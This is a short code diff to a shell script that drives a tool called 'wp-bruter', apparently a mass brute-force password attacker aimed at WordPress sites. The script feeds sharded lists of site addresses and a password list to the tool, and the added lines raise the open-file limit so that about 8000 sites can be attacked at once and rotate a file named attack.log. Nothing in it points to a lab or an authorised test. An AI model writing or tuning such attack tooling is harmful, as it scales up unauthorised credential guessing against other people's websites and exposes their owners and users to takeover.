@@ -8,7 +8,13 @@ set -u
 IDX="${1:?shard index}"
 cd /opt/wp-bruter || exit 1
 
+# 8000 active sites keep ~2 sockets each; the default soft limit (1024) would
+# blow up with "too many open files".
+ulimit -n 262144 2>/dev/null || ulimit -n 65535 2>/dev/null
+
 for LIM in ${PHASES:-150 500 0}; do
+    # Keep the log from filling the disk across long multi-phase runs.
+    [ -f attack.log ] && [ "$(stat -c%s attack.log)" -gt 104857600 ] && mv -f attack.log attack.log.1
     ./wp-bruter \
         -sites "/root/wordpress.s$IDX" \
         -passlist pass.txt \
